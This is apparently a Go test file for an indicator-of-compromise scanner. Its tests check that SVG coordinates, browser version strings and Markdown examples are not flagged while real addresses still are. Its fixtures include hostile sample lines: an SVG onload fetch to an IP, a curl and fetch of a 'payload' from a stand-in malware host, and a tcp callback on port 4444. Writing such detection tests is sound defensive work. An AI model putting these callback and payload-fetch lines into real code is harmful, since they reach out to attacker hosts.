package iocscan

import (
	"strings"
	"testing"
)

// These regressions pin the false positives surfaced by the website repo's
// malscan SARIF. The principle, per maintainer guidance: only drop a candidate
// that was NEVER an IP address (SVG coordinate data spliced into a quad, a
// slash-versioned product token) or that lives in inert documentation. Anything a
// real C2 could inhabit — an IPv4-mapped IPv6 literal, a minified bundle, a source
// map, a test fixture — stays matchable. The offending indicator VALUES are kept
// in the feed (allow.TestVersionLikeIP), so every fix is proven against a set
// seeded with those exact values.

// fpMatcher seeds the set with the real-shaped IOC values the website scan tripped
// on, plus a control known-bad IP that MUST still match.
func fpMatcher() *Matcher {
	set := NewIndicatorSet()
	set.AddAll([]*Indicator{
		{Type: TypeIPv4, Value: "1.15.65.96"},      // @iconify/json SVG path coordinates
		{Type: TypeIPv4, Value: "119.0.0.0"},       // workerd Chrome/119.0.0.0 UA version
		{Type: TypeIPv4, Value: "129.144.52.38"},   // fast-uri ::ffff: fixture (a real-shaped IP)
		{Type: TypeIPv4, Value: "185.100.157.127"}, // control: real address
	})
	return NewMatcher(set, 0)
}

// TestSVGGeometryCoordinatesNotIPv4 — a dotted-quad spliced from the coordinate
// run inside an SVG <path d="…"> (iconify ships these inside .json) was never an
// address and must not match, in any file type.
func TestSVGGeometryCoordinatesNotIPv4(t *testing.T) {
	m := fpMatcher()
	lines := []string{
		`<path fill="currentColor" d="M19 3H5c.67 0 1.15.65.96 1.29z"/>`,                                  // inline svg
		`	"baseline-7k": { "body": "<path fill=\"currentColor\" d=\"M19 3c.67 0 1.15.65.96 1.29z\"/>" },`, // iconify JSON (escaped quotes)
		`<polygon points="0,0 1.15.65.96 2,2"/>`,
	}
	for _, name := range []string{"json/ic.json", "Icon.vue"} {
		for _, line := range lines {
			if ev := m.MatchText(name, line); hasIPv4(ev, "1.15.65.96") {
				t.Errorf("%s: SVG geometry coordinate wrongly matched as IPv4 in %q", name, line)
			}
		}
	}
}

// TestIPInScriptedSVGStillMatches — a real address smuggled into a NON-geometry
// SVG attribute (onload, href) is executable and must remain matchable, even
// though the element is an SVG with geometry on the same line.
func TestIPInScriptedSVGStillMatches(t *testing.T) {
	m := fpMatcher()
	lines := []string{
		`<svg onload="fetch('http://185.100.157.127/x')"><path d="M0 0h24"/></svg>`,
		`<image xlink:href="185.100.157.127/p"/><path d="M1 1l2 2"/>`,
	}
	for _, line := range lines {
		if lm := m.matchLine(line, false); !ipv4InMatches(lm) {
			t.Errorf("real IP in a scripted SVG attribute should still match: %q", line)
		}
	}
}

// TestSlashVersionNotIPv4 — a slash-versioned product token (workerd's
// "Chrome/119.0.0.0") is a version, not a connected endpoint, so it is dropped;
// a scheme-host URL ("http://185.100.157.127/…") keeps its bare-IPv4 hit.
func TestSlashVersionNotIPv4(t *testing.T) {
	m := fpMatcher()
	ua := `   * @default "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"`
	if ev := m.MatchText("worker.mjs", ua); hasIPv4(ev, "119.0.0.0") {
		t.Error("Chrome/119.0.0.0 version string wrongly matched as IPv4")
	}
	for _, line := range []string{
		"connect http://185.100.157.127/payload now",
		"tcp://185.100.157.127:4444",
	} {
		if lm := m.matchLine(line, false); !ipv4InMatches(lm) {
			t.Errorf("line %q: real URL-host IPv4 should still match", line)
		}
	}
}

// TestIPv4MappedIPv6StaysMatchable — an IPv4-mapped IPv6 literal embeds a real
// address a C2 could use, so per maintainer guidance it is NOT suppressed; the
// embedded quad still matches the IP feed.
func TestIPv4MappedIPv6StaysMatchable(t *testing.T) {
	m := fpMatcher()
	for _, line := range []string{
		`socket.connect("::ffff:185.100.157.127", 443)`,
		`  host = "::ffff:129.144.52.38"`,
	} {
		if lm := m.matchLine(line, false); !ipv4InMatches(lm) {
			t.Errorf("IPv4-mapped IPv6 must stay matchable (can be malware): %q", line)
		}
	}
}

// TestInertMarkdownNotScanned — an IP/URL referenced in inert Markdown docs is an
// example, not an IOC, so the filesystem scan raises nothing; the same reference
// in a non-doc, executable file IS flagged.
func TestInertMarkdownNotScanned(t *testing.T) {
	clk := newClock()
	_, loader := standardLoader(t, t.TempDir(), clk)
	root := t.TempDir()
	body := "Post to http://evil-malware.io/payload like:\n\n    curl http://evil-malware.io/payload\n"
	writeFile(t, root, "README.md", body)
	writeFile(t, root, "docs/guide.markdown", body)
	writeFile(t, root, "src/app.js", "fetch('http://evil-malware.io/payload')\n")

	report, err := Scan(Options{Root: root, Ecosystem: "npm", Loader: loader, NoBadnet: true})
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	for _, doc := range []string{"README.md", "docs/guide.markdown"} {
		if findEvidence(report, doc, TypeURL, "http://evil-malware.io/payload") != nil {
			t.Errorf("inert markdown %s must not raise an IOC; got %s", doc, evidenceSummary(report))
		}
	}
	if findEvidence(report, "src/app.js", TypeURL, "http://evil-malware.io/payload") == nil {
		t.Errorf("executable source must still be flagged; got %s", evidenceSummary(report))
	}
}

// atQuad returns the byte offset of the dotted-quad in s (its sole occurrence in
// these cases), so tests don't hand-count escaped/packed offsets.
func atQuad(t *testing.T, s, quad string) int {
	t.Helper()
	i := strings.Index(s, quad)
	if i < 0 {
		t.Fatalf("quad %q not found in %q", quad, s)
	}
	return i
}

func TestIPv4InSVGGeometry(t *testing.T) {
	geom := []string{
		`<path d="M1 1.2.3.4z"/>`,           // unescaped
		`"body":"<path d=\"M1 1.2.3.4\"/>"`, // JSON-escaped opener
		`<polygon points="0,0 1.2.3.4"/>`,
		`<g transform="matrix(1.2.3.4)"/>`,
	}
	for _, s := range geom {
		if !ipv4InSVGGeometry(s, atQuad(t, s, "1.2.3.4")) {
			t.Errorf("ipv4InSVGGeometry(%q) = false, want true", s)
		}
	}
	notGeom := []string{
		`<svg onload="x=1.2.3.4">`,          // non-geometry attribute
		`<path d="M0 0" data-ip="1.2.3.4">`, // later attribute, geometry value already closed
		`connect 1.2.3.4 now`,               // no svg at all
	}
	for _, s := range notGeom {
		if ipv4InSVGGeometry(s, atQuad(t, s, "1.2.3.4")) {
			t.Errorf("ipv4InSVGGeometry(%q) = true, want false", s)
		}
	}
}

func TestIPv4InSlashVersion(t *testing.T) {
	if s := "Chrome/119.0.0.0"; !ipv4InSlashVersion(s, atQuad(t, s, "119.0.0.0")) {
		t.Error("Chrome/119.0.0.0 should be slash-versioned")
	}
	// http://1.2.3.4 — '/' preceded by '/', not a letter — is a real host.
	if s := "http://1.2.3.4"; ipv4InSlashVersion(s, atQuad(t, s, "1.2.3.4")) {
		t.Error("http:// host must not be treated as a version")
	}
	if s := "host 1.2.3.4"; ipv4InSlashVersion(s, atQuad(t, s, "1.2.3.4")) {
		t.Error("whitespace-delimited IP must not be treated as a version")
	}
}
